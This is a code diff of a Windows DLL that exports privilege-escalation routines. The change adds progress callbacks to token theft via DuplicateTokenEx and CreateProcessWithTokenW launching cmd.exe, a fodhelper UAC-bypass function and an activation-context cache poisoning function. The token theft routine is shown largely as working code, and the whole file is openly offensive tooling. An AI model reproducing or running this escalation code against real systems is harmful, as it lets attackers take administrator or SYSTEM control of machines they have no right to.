@@ -10,6 +10,8 @@
 #include <stdio.h>
 #include <wchar.h>
 
+#define STEP(cb, name, idx) if ((cb) != NULL) (cb)(name, idx)
+
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved
@@ -26,7 +28,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     return TRUE;
 }
 
-extern "C" __declspec(dllexport) int TokenTheftEscalation(DWORD pid) {
+extern "C" __declspec(dllexport) int TokenTheftEscalation(DWORD pid, StepCallback callback) {
     HANDLE token;
     TOKEN_PRIVILEGES tp;
     LUID luid;
@@ -34,11 +36,15 @@ extern "C" __declspec(dllexport) int TokenTheftEscalation(DWORD pid) {
     if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
         printf("LookupPrivilegeValue failed: %lu\n", GetLastError());
         return -1;
+    } else {
+        STEP(callback, "LookupPrivilegeValue", 0);
     }
 
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) {
         printf("%lu\n", GetLastError());
         return -2;
+    } else {
+        STEP(callback, "OpenProcessToken", 1);
     }
 
     tp.PrivilegeCount = 1;
@@ -49,9 +55,10 @@ extern "C" __declspec(dllexport) int TokenTheftEscalation(DWORD pid) {
         printf("%lu\n", GetLastError());
         CloseHandle(token);
         return -3;
+    } else {
+        printf("AdjustTokenPrivileges OK\n");
+        STEP(callback, "AdjustTokenPrivileges", 2);
     }
-
-    printf("AdjustTokenPrivileges OK\n");
 
     CloseHandle(token);
 
@@ -63,7 +70,8 @@ extern "C" __declspec(dllexport) int TokenTheftEscalation(DWORD pid) {
     if (!ph) {
         printf("OpenProcess failed: %lu\n", GetLastError());
         return -4;
-
+    } else {
+        STEP(callback, "OpenProcess", 3);
     }
 
     printf("OpenProcessToken (target) OK\n");
@@ -72,6 +80,8 @@ extern "C" __declspec(dllexport) int TokenTheftEscalation(DWORD pid) {
         printf("OpenProcessToken (target) failed: %lu\n", GetLastError());
         CloseHandle(ph);
         return -5;
+    } else {
+        STEP(callback, "OpenProcessToken", 4);
     }
 
     CloseHandle(ph);
@@ -88,9 +98,10 @@ extern "C" __declspec(dllexport) int TokenTheftEscalation(DWORD pid) {
         printf("[-] DuplicateTokenEx failed: %lu\n", GetLastError());
         CloseHandle(cToken);
         return -6;
+    } else {
+        printf("DuplicateTokenEx OK\n");
+        STEP(callback, "DuplicateTokenEx", 5);
     }
-
-    printf("DuplicateTokenEx OK\n");
 
     LPCWSTR appPath = L"C:\\Windows\\System32\\cmd.exe";
 
@@ -99,6 +110,8 @@ extern "C" __declspec(dllexport) int TokenTheftEscalation(DWORD pid) {
         CloseHandle(cToken);
         CloseHandle(dToken);
         return -7;
+    } else {
+        STEP(callback, "CreateProcessWithTokenW", 6);
     }
 
     CloseHandle(pi.hProcess);
@@ -109,7 +122,7 @@ extern "C" __declspec(dllexport) int TokenTheftEscalation(DWORD pid) {
     return 0;
 }
 
-extern "C" __declspec(dllexport) int FodHelperAbuseEscalation(const char* execPath) {
+extern "C" __declspec(dllexport) int FodHelperAbuseEscalation(const char* execPath, StepCallback callback) {
 
     Marker();
 
@@ -146,7 +159,7 @@ extern "C" __declspec(dllexport) int FodHelperAbuseEscalation(const char* execPa
 
     Marker();
 
-    FodHelperAbuseEscalationInternal(execPath);
+    FodHelperAbuseEscalationInternal(execPath, callback);
 
     RevertToSelf();
     CloseHandle(hImpersonation);
@@ -195,4 +208,3 @@ extern "C" __declspec(dllexport) int ActivationContextCachePoisoningEscalation()
     CloseHandle(hImpersonation);
     return 0;
 }
-
